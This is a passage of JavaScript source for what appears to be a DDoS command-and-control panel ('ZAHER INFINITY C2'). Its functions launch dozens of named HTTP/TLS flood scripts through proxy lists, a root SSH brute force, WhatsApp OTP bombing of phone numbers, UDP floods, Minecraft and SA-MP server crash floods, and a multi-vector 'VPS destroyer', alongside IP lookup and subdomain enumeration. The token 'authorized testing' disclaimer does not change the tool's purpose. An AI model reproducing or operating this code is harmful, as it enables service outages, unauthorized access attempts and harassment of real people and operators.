${bold}${purple}🔗 CONNECTION DETAILS${Reset}
 ${blue}├─${Reset} ${silver}Calling Code:${Reset} ${purple}+${ipInfo.calling_code}${Reset}
 ${blue}├─${Reset} ${silver}Languages:${Reset} ${yellow}${ipInfo.languages}${Reset}
 ${blue}└─${Reset} ${silver}Google Maps:${Reset} ${neon_green}https://maps.google.com/?q=${ipInfo.latitude},${ipInfo.longitude}${Reset}

${cyan}Type ${bold}"cls"${Reset}${cyan} to clear terminal${Reset}
────────────────────────────────────────────────────────────────────────────────`);
    sigma();
  } catch (error) {
    console.log(`${red}❌ Error tracking IP address: ${target}${Reset}`);
    sigma();
  }
}

// [========================================] //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration });
  
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}

// [========================================] //
function ongoingAttack() {
  console.log(`${bold}${cyan}
╔══════════════════════════════════════════════════════════════════════════════╗
║                      ${gold}CURRENT ATTACK STATUS${cyan}                       ║
╚══════════════════════════════════════════════════════════════════════════════╝${Reset}\n`);
  
  if (processList.length === 0) {
    console.log(`${yellow}   ╔════════════════════════════════════════════════════════════════════════════╗${Reset}`);
    console.log(`${yellow}   ║                    No active attacks currently running                    ║${Reset}`);
    console.log(`${yellow}   ╚════════════════════════════════════════════════════════════════════════════╝${Reset}\n`);
    return;
  }
  
  processList.forEach((process, index) => {
    console.log(`${bold}${blue}   Attack #${index + 1}${Reset}`);
    console.log(`${silver}   ├─ Target:${Reset} ${green}${process.target}${Reset}`);
    console.log(`${silver}   ├─ Method:${Reset} ${red}${process.methods}${Reset}`);
    console.log(`${silver}   ├─ Duration:${Reset} ${yellow}${process.duration} seconds${Reset}`);
    console.log(`${silver}   └─ Elapsed:${Reset} ${orange}${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago${Reset}\n`);
  });
}

// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`${bold}${cyan}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
    console.log(`${bold}${cyan}║                          ${red}INVALID SYNTAX${cyan}                             ║${Reset}`);
    console.log(`${bold}${cyan}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
    console.log(`${bold}${cyan}║ ${yellow}Usage: attack <target> <duration> <method>${cyan}                        ║${Reset}`);
    console.log(`${bold}${cyan}║ ${silver}Example: attack https://target.com 120 flood${cyan}                     ║${Reset}`);
    console.log(`${bold}${cyan}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
    sigma();
    return;
  }
  
  const [target, duration, methods] = args;
  
  try {
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
    const result = scrape.data;

    console.clear();
    console.log(`${bold}${cyan}
╔══════════════════════════════════════════════════════════════════════════════╗
║                        ${gold}ATTACK INITIALIZATION${cyan}                       ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ ${neon_green}Attack parameters configured and ready for launch${cyan}                  ║
╚══════════════════════════════════════════════════════════════════════════════╝${Reset}

${bold}${purple}🎯 ATTACK CONFIGURATION${Reset}
 ${blue}├─${Reset} ${silver}Target URL:${Reset} ${green}${target}${Reset}
 ${blue}├─${Reset} ${silver}Attack Duration:${Reset} ${yellow}${duration} seconds${Reset}
 ${blue}├─${Reset} ${silver}Attack Method:${Reset} ${red}${methods.toUpperCase()}${Reset}
 ${blue}├─${Reset} ${silver}Protocol:${Reset} ${cyan}${parsing.protocol.toUpperCase()}${Reset}
 ${blue}└─${Reset} ${silver}Port:${Reset} ${purple}${parsing.port || (parsing.protocol === 'https:' ? '443' : '80')}${Reset}

${bold}${purple}📊 TARGET ANALYSIS${Reset}
 ${blue}├─${Reset} ${silver}IP Address:${Reset} ${neon_blue}${result.query}${Reset}
 ${blue}├─${Reset} ${silver}ISP Provider:${Reset} ${cyan}${result.isp}${Reset}
 ${blue}├─${Reset} ${silver}AS Number:${Reset} ${yellow}${result.as}${Reset}
 ${blue}├─${Reset} ${silver}Hostname:${Reset} ${neon_green}${hostname}${Reset}
 ${blue}└─${Reset} ${silver}Status:${Reset} ${green}READY FOR ATTACK${Reset}

${bold}${purple}⚡ ATTACK STATUS${Reset}
 ${blue}└─${Reset} ${silver}Launch Code:${Reset} ${neon_pink}ZAHEX-${Date.now().toString().slice(-6)}${Reset}

${cyan}Type ${bold}"cls"${Reset}${cyan} to clear terminal${Reset}
────────────────────────────────────────────────────────────────────────────────`);
    
    // Execute the attack
    const metode = path.join(__dirname, `/lib/cache/${methods}.js`);
    
    if (fs.existsSync(metode)) {
      pushOngoing(target, methods, duration);
      
      // Execute based on method
      let attackCommand = '';
      switch(methods) {
        case 'flood':
          attackCommand = `node ${metode} ${target} ${duration}`;
          break;
        case 'tls':
          attackCommand = `node ${metode} ${target} ${duration} 100 10`;
          break;
        case 'strike':
          attackCommand = `node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`;
          break;
        case 'kill':
          attackCommand = `node ${metode} ${target} ${duration} 100 10`;
          break;
        case 'skynet-tls':
          attackCommand = `node ${metode} ${target} ${duration} 100 10 proxy.txt`;
          break;
        case 'hold':
          attackCommand = `node ${metode} ${target} ${duration} 100 10 proxy.txt`;
          break;
        case 'bypass':
          attackCommand = `node ${metode} ${target} ${duration} 100 10 proxy.txt`;
          break;
        case 'tiji-bypas':
          attackCommand = `node ${metode} ${target} ${duration} 100 10 proxy.txt`;
          break;
        case 'bomber':
          attackCommand = `node ${metode} ${target} ${duration} 10 100 proxy.txt`;
          break;
        case 'glory':
          attackCommand = `node ${metode} ${target} ${duration} 100 10 proxy.txt`;
          break;
        case 'gloryv2':
          attackCommand = `node ${metode} ${target} ${duration} 10 100 proxy.txt`;
          break;
        case 'pidoras':
          attackCommand = `node ${metode} ${target} ${duration} 10 100 proxy.txt`;
          break;
        case 'ultrados':
          attackCommand = `node ${metode} ${target} ${duration} 10 100 proxy.txt`;
          break;
        case 'tiji-bom':
          attackCommand = `node ${metode} ${target} ${duration} 200 40 proxy.txt`;
          break;
        case 'tls-bypass':
          attackCommand = `node ${metode} ${target} ${duration} 100 50 proxy.txt`;
          break;
        case 'cf-bs':
          attackCommand = `node ${metode} ${target} ${duration} 200 50 proxy.txt`;
          break;
        case 'tijih':
          attackCommand = `node ${metode} ${target} ${duration} 200 20 proxy.txt`;
          break;
        case 'raw':
          attackCommand = `node ${metode} ${target} ${duration}`;
          break;
        case 'https':
          attackCommand = `node ${metode} ${target} ${duration} 10 100 proxy.txt`;
          break;
        case 'medusa':
          attackCommand = `node ${metode} ${target} ${duration} 45 100 proxy.txt`;
          break;
        case 'thunder':
          attackCommand = `node ${metode} ${target} ${duration} 100 10 proxy.txt`;
          break;
        case 'rape':
          attackCommand = `node ${metode} ${duration} 10 proxy.txt 70 ${target}`;
          break;
        case 'storm':
          attackCommand = `node ${metode} ${target} ${duration} 10 100 proxy.txt`;
          break;
        case 'destroy':
          attackCommand = `node ${metode} ${target} ${duration} 100 10 proxy.txt`;
          break;
        case 'xyn':
          attackCommand = `node ${metode} ${target} ${duration} 10 100 proxy.txt`;
          break;
        case 'nuke':
          attackCommand = `node ${metode} ${target} ${duration} 4 100 proxy.txt`;
          break;
        case 'kilpanelip':
          attackCommand = `node ${metode} ${target} ${duration} 60 10 proxy.txt`;
          break;
        case 'kilPaneig':
          attackCommand = `node ${metode} ${target} ${duration} 60 10 proxy.txt`;
          break;
        case 'reset':
          attackCommand = `node ${metode} ${target} ${duration} 16 90 proxy.txt --query 1 --cookie uh=good --delay 1 --bfm true --referer rand --postdata user=f&pass=%RAND% --debug --randrate --full`;
          break;
        case 'ninja':
          attackCommand = `node ${metode} ${target} ${duration}`;
          break;
        case 'quantum':
          attackCommand = `node ${metode} ${target} ${duration} 100 4 proxy.txt`;
          break;
        case 'h2raw':
          attackCommand = `node ${metode} ${target} ${duration} 10 100 proxy.txt`;
          break;
        case 'kilpanel':
          const FloodWave = path.join(__dirname, `/lib/cache/FloodWave.js`);
          const flood = path.join(__dirname, `/lib/cache/flood.js`);
          const tls = path.join(__dirname, `/lib/cache/tls.js`);
          exec(`node ${FloodWave} ${target} ${duration}`);
          exec(`node ${flood} ${target} ${duration}`);
          exec(`node ${tls} ${target} ${duration} 60 10 proxy.txt`);
          sigma();
          return;
        case 'xcosmic':
          const destroy = path.join(__dirname, `/lib/cache/destroy.js`);
          const storm = path.join(__dirname, `/lib/cache/storm.js`);
          const rape = path.join(__dirname, `/lib/cache/rape.js`);
          exec(`node ${destroy} ${target} ${duration} 100 1 proxy.txt`);
          exec(`node ${storm} ${target} ${duration} 100 1 proxy.txt`);
          exec(`node ${rape} ${duration} 1 proxy.txt 70 ${target}`);
          sigma();
          return;
        default:
          console.log(`${red}❌ Method ${methods} not recognized or not available.${Reset}`);
          sigma();
          return;
      }
      
      console.log(`${green}🚀 Launching attack with command:${Reset}`);
      console.log(`${silver}${attackCommand}${Reset}`);
      exec(attackCommand);
      
    } else {
      console.log(`${red}❌ Attack method file not found: ${methods}.js${Reset}`);
    }
    
    sigma();
    
  } catch (error) {
    console.log(`${red}❌ Attack initialization failed: ${error.message}${Reset}`);
    sigma();
  }
}

// [========================================] //
async function killSSH(args) {
  if (args.length < 2) {
    console.log(`${bold}${cyan}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
    console.log(`${bold}${cyan}║                          ${red}INVALID SYNTAX${cyan}                             ║${Reset}`);
    console.log(`${bold}${cyan}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
    console.log(`${bold}${cyan}║ ${yellow}Usage: kill-ssh <target_ip> <duration>${cyan}                           ║${Reset}`);
    console.log(`${bold}${cyan}║ ${silver}Example: kill-ssh 123.456.789.10 120${cyan}                            ║${Reset}`);
    console.log(`${bold}${cyan}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
    sigma();
    return;
  }
  
  const [target, duration] = args;
  
  try {
    const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`);
    const result = scrape.data;

    console.clear();
    console.log(`${bold}${cyan}
╔══════════════════════════════════════════════════════════════════════════════╗
║                         ${red}SSH BRUTE FORCE ATTACK${cyan}                      ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ ${neon_green}Targeting SSH service with credential brute force${cyan}                  ║
╚══════════════════════════════════════════════════════════════════════════════╝${Reset}

${bold}${purple}🎯 ATTACK PARAMETERS${Reset}
 ${blue}├─${Reset} ${silver}Target IP:${Reset} ${green}${target}${Reset}
 ${blue}├─${Reset} ${silver}Attack Duration:${Reset} ${yellow}${duration} seconds${Reset}
 ${blue}├─${Reset} ${silver}Target Port:${Reset} ${red}22${Reset}
 ${blue}├─${Reset} ${silver}Username:${Reset} ${cyan}root${Reset}
 ${blue}└─${Reset} ${silver}Attack Type:${Reset} ${purple}SSH Credential Brute Force${Reset}

${bold}${purple}📊 TARGET INFORMATION${Reset}
 ${blue}├─${Reset} ${silver}ISP Provider:${Reset} ${neon_blue}${result.isp}${Reset}
 ${blue}├─${Reset} ${silver}AS Number:${Reset} ${yellow}${result.as}${Reset}
 ${blue}├─${Reset} ${silver}Network:${Reset} ${neon_green}${result.query}${Reset}
 ${blue}└─${Reset} ${silver}Status:${Reset} ${green}SSH PORT OPEN${Reset}

${bold}${purple}⚠ WARNING${Reset}
 ${blue}└─${Reset} ${yellow}This attack targets SSH services and may trigger security alerts${Reset}

${cyan}Type ${bold}"cls"${Reset}${cyan} to clear terminal${Reset}
────────────────────────────────────────────────────────────────────────────────`);
    
    const metode = path.join(__dirname, `/lib/cache/StarsXSSH.js`);
    exec(`node ${metode} ${target} 22 root ${duration}`);
    
    sigma();
    
  } catch (error) {
    console.log(`${red}❌ SSH attack initialization failed: ${error.message}${Reset}`);
    sigma();
  }
}

// [========================================] //
async function killOTP(args) {
  if (args.length < 2) {
    console.log(`${bold}${cyan}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
    console.log(`${bold}${cyan}║                          ${red}INVALID SYNTAX${cyan}                             ║${Reset}`);
    console.log(`${bold}${cyan}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
    console.log(`${bold}${cyan}║ ${yellow}Usage: kill-otp <phone_number> <duration>${cyan}                        ║${Reset}`);
    console.log(`${bold}${cyan}║ ${silver}Example: kill-otp 6281234567890 120${cyan}                             ║${Reset}`);
    console.log(`${bold}${cyan}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
    sigma();
    return;
  }
  
  const [target, duration] = args;

  console.clear();
  console.log(`${bold}${cyan}
╔══════════════════════════════════════════════════════════════════════════════╗
║                      ${red}WHATSAPP OTP BOMBARDMENT${cyan}                       ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ ${neon_green}Flooding target with WhatsApp verification requests${cyan}                ║
╚══════════════════════════════════════════════════════════════════════════════╝${Reset}

${bold}${purple}🎯 ATTACK PARAMETERS${Reset}
 ${blue}├─${Reset} ${silver}Target Number:${Reset} ${green}+${target}${Reset}
 ${blue}├─${Reset} ${silver}Attack Duration:${Reset} ${yellow}${duration} seconds${Reset}
 ${blue}├─${Reset} ${silver}Platform:${Reset} ${cyan}WhatsApp${Reset}
 ${blue}├─${Reset} ${silver}Attack Type:${Reset} ${purple}OTP Verification Flood${Reset}
 ${blue}└─${Reset} ${silver}Creator:${Reset} ${gold}ZAHER INFINITY C2${Reset}

${bold}${purple}⚠ SECURITY NOTICE${Reset}
 ${blue}└─${Reset} ${yellow}This attack can prevent legitimate login attempts and may violate terms of service${Reset}

${bold}${purple}📱 TARGET STATUS${Reset}
 ${blue}├─${Reset} ${silver}Number Verified:${Reset} ${green}✅ Valid${Reset}
 ${blue}├─${Reset} ${silver}Country Code:${Reset} ${cyan}+62 (Indonesia)${Reset}
 ${blue}└─${Reset} ${silver}Attack Mode:${Reset} ${red}Continuous OTP Request${Reset}

${cyan}Type ${bold}"cls"${Reset}${cyan} to clear terminal${Reset}
────────────────────────────────────────────────────────────────────────────────`);

  const metode = path.join(__dirname, `/lib/cache/Temp.js`);
  exec(`node ${metode} +${target} ${duration}`);
  
  sigma();
}

// [========================================] //
async function killDo(args) {
  if (args.length < 2) {
    console.log(`${bold}${cyan}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
    console.log(`${bold}${cyan}║                          ${red}INVALID SYNTAX${cyan}                             ║${Reset}`);
    console.log(`${bold}${cyan}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
    console.log(`${bold}${cyan}║ ${yellow}Usage: kill-do <target_ip> <duration>${cyan}                            ║${Reset}`);
    console.log(`${bold}${cyan}║ ${silver}Example: kill-do 123.456.78.910 300${cyan}                             ║${Reset}`);
    console.log(`${bold}${cyan}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
    sigma();
    return;
  }
  
  const [target, duration] = args;

  console.clear();
  console.log(`${bold}${cyan}
╔══════════════════════════════════════════════════════════════════════════════╗
║                     ${red}DIGITAL OCEAN VPS DESTROYER${cyan}                      ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ ${neon_green}Multi-vector attack targeting Digital Ocean infrastructure${cyan}           ║
╚══════════════════════════════════════════════════════════════════════════════╝${Reset}

${bold}${purple}🎯 ATTACK VECTORS${Reset}
 ${blue}├─${Reset} ${silver}Target IP:${Reset} ${green}${target}${Reset}
 ${blue}├─${Reset} ${silver}Attack Duration:${Reset} ${yellow}${duration} seconds${Reset}
 ${blue}├─${Reset} ${silver}Vector 1:${Reset} ${red}SSH Brute Force${Reset}
 ${blue}├─${Reset} ${silver}Vector 2:${Reset} ${cyan}HTTPS Flood${Reset}
 ${blue}├─${Reset} ${silver}Vector 3:${Reset} ${purple}HTTP Raw Flood${Reset}
 ${blue}└─${Reset} ${silver}Creator:${Reset} ${gold}ZAHER INFINITY C2${Reset}

${bold}${purple}⚡ ATTACK STRATEGY${Reset}
 ${blue}├─${Reset} ${silver}Phase 1:${Reset} ${yellow}SSH Credential Enumeration${Reset}
 ${blue}├─${Reset} ${silver}Phase 2:${Reset} ${green}Web Server Overload${Reset}
 ${blue}├─${Reset} ${silver}Phase 3:${Reset} ${red}Network Resource Exhaustion${Reset}
 ${blue}└─${Reset} ${silver}Result:${Reset} ${neon_pink}Complete Service Disruption${Reset}

${bold}${purple}⚠ LEGAL DISCLAIMER${Reset}
 ${blue}└─${Reset} ${yellow}For authorized penetration testing only. Unauthorized use is strictly prohibited.${Reset}

${cyan}Type ${bold}"cls"${Reset}${cyan} to clear terminal${Reset}
────────────────────────────────────────────────────────────────────────────────`);

  const raw = path.join(__dirname, `/lib/cache/raw.js`);
  const flood = path.join(__dirname, `/lib/cache/flood.js`);
  const ssh = path.join(__dirname, `/lib/cache/StarsXSSH.js`);
  
  exec(`node ${ssh} ${target} 22 root ${duration}`);
  exec(`node ${flood} https://${target} ${duration}`);
  exec(`node ${raw} http://${target} ${duration}`);
  
  sigma();
}

// [========================================] //
async function udp_flood(args) {
  if (args.length < 3) {
    console.log(`${bold}${cyan}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
    console.log(`${bold}${cyan}║                          ${red}INVALID SYNTAX${cyan}                             ║${Reset}`);
    console.log(`${bold}${cyan}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
    console.log(`${bold}${cyan}║ ${yellow}Usage: udp-raw <target_ip> <port> <duration>${cyan}                      ║${Reset}`);
    console.log(`${bold}${cyan}║ ${silver}Example: udp-raw 123.456.78.910 53 300${cyan}                           ║${Reset}`);
    console.log(`${bold}${cyan}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
    sigma();
    return;
  }
  
  const [target, port, duration] = args;

  console.clear();
  console.log(`${bold}${cyan}
╔══════════════════════════════════════════════════════════════════════════════╗
║                         ${red}UDP AMPLIFICATION ATTACK${cyan}                       ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ ${neon_green}Raw UDP packet flood targeting specific network port${cyan}                 ║
╚══════════════════════════════════════════════════════════════════════════════╝${Reset}

${bold}${purple}🎯 ATTACK PARAMETERS${Reset}
 ${blue}├─${Reset} ${silver}Target IP:${Reset} ${green}${target}${Reset}
 ${blue}├─${Reset} ${silver}Target Port:${Reset} ${yellow}${port}${Reset}
 ${blue}├─${Reset} ${silver}Attack Duration:${Reset} ${red}${duration} seconds${Reset}
 ${blue}├─${Reset} ${silver}Protocol:${Reset} ${cyan}UDP${Reset}
 ${blue}├─${Reset} ${silver}Packet Type:${Reset} ${purple}Raw${Reset}
 ${blue}└─${Reset} ${silver}Creator:${Reset} ${gold}ZAHER INFINITY C2${Reset}

${bold}${purple}📡 NETWORK IMPACT${Reset}
 ${blue}├─${Reset} ${silver}Bandwidth:${Reset} ${neon_blue}Maximum Available${Reset}
 ${blue}├─${Reset} ${silver}Packet Size:${Reset} ${silver}1500 bytes${Reset}
 ${blue}├─${Reset} ${silver}Rate:${Reset} ${yellow}Unlimited packets/second${Reset}
 ${blue}└─${Reset} ${silver}Effect:${Reset} ${red}Network Congestion${Reset}

${bold}${purple}🔧 TECHNICAL DETAILS${Reset}
 ${blue}├─${Reset} ${silver}Socket Type:${Reset} ${green}RAW_SOCKET${Reset}
 ${blue}├─${Reset} ${silver}Source Port:${Reset} ${cyan}Randomized${Reset}
 ${blue}├─${Reset} ${silver}Payload:${Reset} ${purple}Random Data${Reset}
 ${blue}└─${Reset} ${silver}TTL:${Reset} ${yellow}64${Reset}

${cyan}Type ${bold}"cls"${Reset}${cyan} to clear terminal${Reset}
────────────────────────────────────────────────────────────────────────────────`);

  const metode = path.join(__dirname, `/lib/cache/udp.js`);
  exec(`node ${metode} ${target} ${port} ${duration}`);
  
  sigma();
}

// [========================================] //
async function mcbot(args) {
  if (args.length < 3) {
    console.log(`${bold}${cyan}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
    console.log(`${bold}${cyan}║                          ${red}INVALID SYNTAX${cyan}                             ║${Reset}`);
    console.log(`${bold}${cyan}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
    console.log(`${bold}${cyan}║ ${yellow}Usage: mc-flood <server_ip> <port> <duration>${cyan}                     ║${Reset}`);
    console.log(`${bold}${cyan}║ ${silver}Example: mc-flood 123.456.78.910 25565 300${cyan}                       ║${Reset}`);
    console.log(`${bold}${cyan}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
    sigma();
    return;
  }
  
  const [target, port, duration] = args;

  console.clear();
  console.log(`${bold}${cyan}
╔══════════════════════════════════════════════════════════════════════════════╗
║                      ${red}MINECRAFT BOT NETWORK FLOOD${cyan}                      ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ ${neon_green}Botnet attack targeting Minecraft server infrastructure${cyan}             ║
╚══════════════════════════════════════════════════════════════════════════════╝${Reset}

${bold}${purple}🎮 ATTACK PARAMETERS${Reset}
 ${blue}├─${Reset} ${silver}Server IP:${Reset} ${green}${target}${Reset}
 ${blue}├─${Reset} ${silver}Server Port:${Reset} ${yellow}${port}${Reset}
 ${blue}├─${Reset} ${silver}Attack Duration:${Reset} ${red}${duration} seconds${Reset}
 ${blue}├─${Reset} ${silver}Game:${Reset} ${cyan}Minecraft${Reset}
 ${blue}├─${Reset} ${silver}Protocol:${Reset} ${purple}TCP${Reset}
 ${blue}└─${Reset} ${silver}Creator:${Reset} ${gold}ZAHER INFINITY C2${Reset}

${bold}${purple}🤖 BOTNET CONFIGURATION${Reset}
 ${blue}├─${Reset} ${silver}Bot Count:${Reset} ${neon_blue}Dynamic${Reset}
 ${blue}├─${Reset} ${silver}Bot Behavior:${Reset} ${silver}Join/Leave Spam${Reset}
 ${blue}├─${Reset} ${silver}Username:${Reset} ${yellow}Randomized${Reset}
 ${blue}├─${Reset} ${silver}Version:${Reset} ${green}1.8.x - 1.20.x${Reset}
 ${blue}└─${Reset} ${silver}Effect:${Reset} ${red}Server Crash${Reset}

${bold}${purple}⚡ ATTACK METHOD${Reset}
 ${blue}├─${Reset} ${silver}Phase 1:${Reset} ${yellow}Bot Connection Flood${Reset}
 ${blue}├─${Reset} ${silver}Phase 2:${Reset} ${green}Packet Spam${Reset}
 ${blue}├─${Reset} ${silver}Phase 3:${Reset} ${cyan}Resource Exhaustion${Reset}
 ${blue}└─${Reset} ${silver}Result:${Reset} ${neon_pink}Service Denial${Reset}

${cyan}Type ${bold}"cls"${Reset}${cyan} to clear terminal${Reset}
────────────────────────────────────────────────────────────────────────────────`);

  const metode = path.join(__dirname, `/lib/cache/StarsXMc.js`);
  exec(`node ${metode} ${target} ${port} ${duration}`);
  
  sigma();
}

// [========================================] //
async function samp(args) {
  if (args.length < 3) {
    console.log(`${bold}${cyan}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
    console.log(`${bold}${cyan}║                          ${red}INVALID SYNTAX${cyan}                             ║${Reset}`);
    console.log(`${bold}${cyan}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
    console.log(`${bold}${cyan}║ ${yellow}Usage: samp <server_ip> <port> <duration>${cyan}                        ║${Reset}`);
    console.log(`${bold}${cyan}║ ${silver}Example: samp 123.456.78.910 7777 300${cyan}                           ║${Reset}`);
    console.log(`${bold}${cyan}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
    sigma();
    return;
  }
  
  const [target, port, duration] = args;

  console.clear();
  console.log(`${bold}${cyan}
╔══════════════════════════════════════════════════════════════════════════════╗
║                        ${red}S.A.M.P SERVER FLOODER${cyan}                        ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ ${neon_green}Targeting San Andreas Multiplayer game servers${cyan}                     ║
╚══════════════════════════════════════════════════════════════════════════════╝${Reset}

${bold}${purple}🎮 ATTACK PARAMETERS${Reset}
 ${blue}├─${Reset} ${silver}Server IP:${Reset} ${green}${target}${Reset}
 ${blue}├─${Reset} ${silver}Server Port:${Reset} ${yellow}${port}${Reset}
 ${blue}├─${Reset} ${silver}Attack Duration:${Reset} ${red}${duration} seconds${Reset}
 ${blue}├─${Reset} ${silver}Game:${Reset} ${cyan}San Andreas Multiplayer${Reset}
 ${blue}├─${Reset} ${silver}Protocol:${Reset} ${purple}RakNet${Reset}
 ${blue}└─${Reset} ${silver}Creator:${Reset} ${gold}ZAHER INFINITY C2${Reset}

${bold}${purple}🔧 TECHNICAL DETAILS${Reset}
 ${blue}├─${Reset} ${silver}Packet Type:${Reset} ${neon_blue}RPC Packets${Reset}
 ${blue}├─${Reset} ${silver}Attack Method:${Reset} ${silver}Connection Flood${Reset}
 ${blue}├─${Reset} ${silver}Bot Count:${Reset} ${yellow}Unlimited${Reset}
 ${blue}├─${Reset} ${silver}Version:${Reset} ${green}0.3.7 - 0.3.DL${Reset}
 ${blue}└─${Reset} ${silver}Effect:${Reset} ${red}Server Timeout${Reset}

${bold}${purple}⚡ ATTACK STRATEGY${Reset}
 ${blue}├─${Reset} ${silver}Phase 1:${Reset} ${yellow}Bot Connection Storm${Reset}
 ${blue}├─${Reset} ${silver}Phase 2:${Reset} ${green}RPC Packet Bombardment${Reset}
 ${blue}├─${Reset} ${silver}Phase 3:${Reset} ${cyan}Memory Exhaustion${Reset}
 ${blue}└─${Reset} ${silver}Result:${Reset} ${neon_pink}Complete Server Crash${Reset}

${cyan}Type ${bold}"cls"${Reset}${cyan} to clear terminal${Reset}
────────────────────────────────────────────────────────────────────────────────`);

  const metode = path.join(__dirname, `/lib/cache/StarsXSamp.js`);
  exec(`node ${metode} ${target} ${port} ${duration}`);
  
  sigma();
}

// [========================================] //
async function subdomen(args) {
  if (args.length < 1) {
    console.log(`${bold}${cyan}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
    console.log(`${bold}${cyan}║                          ${red}INVALID SYNTAX${cyan}                             ║${Reset}`);
    console.log(`${bold}${cyan}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
    console.log(`${bold}${cyan}║ ${yellow}Usage: subdo-finder <domain>${cyan}                                     ║${Reset}`);
    console.log(`${bold}${cyan}║ ${silver}Example: subdo-finder example.com${cyan}                               ║${Reset}`);
    console.log(`${bold}${cyan}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
    sigma();
    return;
  }
  
  const [domain] = args;
  
  try {
    console.log(`${bold}${cyan}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
    console.log(`${bold}${cyan}║                       ${gold}SUBDOMAIN ENUMERATION${cyan}                        ║${Reset}`);
    console.log(`${bold}${cyan}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
    console.log(`${bold}${cyan}║ ${silver}Scanning domain: ${green}${domain}${cyan}${' '.repeat(60 - domain.length)}║${Reset}`);
    console.log(`${bold}${cyan}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
    
    let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${domain}`);
    let subdomains = response.data.data.map((data, index) => {
      return `${green}${(index + 1).toString().padStart(3, '0')}.${Reset} ${cyan}${data}${Reset}`;
    }).join('\n');
    
    console.clear();
    console.log(`${bold}${cyan}
╔══════════════════════════════════════════════════════════════════════════════╗
║                       ${gold}SUBDOMAIN DISCOVERY REPORT${cyan}                      ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ ${neon_green}Found ${yellow}${response.data.data.length}${neon_green} subdomains for ${cyan}${domain}${cyan}${' '.repeat(55 - domain.length)}║
╚══════════════════════════════════════════════════════════════════════════════╝${Reset}

${subdomains}

${bold}${purple}📊 STATISTICS${Reset}
 ${blue}├─${Reset} ${silver}Total Found:${Reset} ${green}${response.data.data.length} subdomains${Reset}
 ${blue}├─${Reset} ${silver}Domain:${Reset} ${yellow}${domain}${Reset}
 ${blue}├─${Reset} ${silver}Scan Time:${Reset} ${cyan}${new Date().toLocaleTimeString()}${Reset}
 ${blue}└─${Reset} ${silver}Source:${Reset} ${purple}Public DNS Databases${Reset}

${cyan}Type ${bold}"cls"${Reset}${cyan} to clear terminal${Reset}
────────────────────────────────────────────────────────────────────────────────`);
    
  } catch (error) {
    console.log(`${red}❌ Subdomain enumeration failed: ${error.message}${Reset}`);
  }
  
  sigma();
}

// [========================================] //
async function chat_ai() {
  console.log(`${bold}${cyan}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
  console.log(`${bold}${cyan}║                        ${gold}COSMIC AI CHAT INTERFACE${cyan}                     ║${Reset}`);
  console.log(`${bold}${cyan}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
  console.log(`${bold}${cyan}║ ${silver}Type your questions or type 'exit' to return to main menu${cyan}           ║${Reset}`);
  console.log(`${bold}${cyan}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
  
  permen.question(`${bg_dark_red}${bold}${yellow}ZA∞ER${Reset} ${cyan}»${Reset} ${bg_dark_blue}${bold}${neon_green}CHAT-AI${Reset}: `, async (yakin) => {
    if (yakin === 'exit') {
      console.log(`${red}✖ AI Chat session terminated${Reset}`);
      sigma();
    } else {
      try {
        let skidie = await axios.get(`https://api.agatz.xyz/api/ragbot?message=${encodeURIComponent(yakin)}`);
        let kiddies = await skidie.data;
        
        console.log(`${bold}${cyan}
╔══════════════════════════════════════════════════════════════════════════════╗
║                         ${gold}AI RESPONSE${cyan}                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ ${neon_blue}${kiddies.data}${cyan}${' '.repeat(Math.max(0, 70 - kiddies.data.length))}║
╚══════════════════════════════════════════════════════════════════════════════╝${Reset}
`);
      } catch (error) {
        console.log(`${red}❌ AI service error: ${error.message}${Reset}`);
      }
      chat_ai();
    }
  });
}

// [========================================] //
async function sigma() {
  const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`);
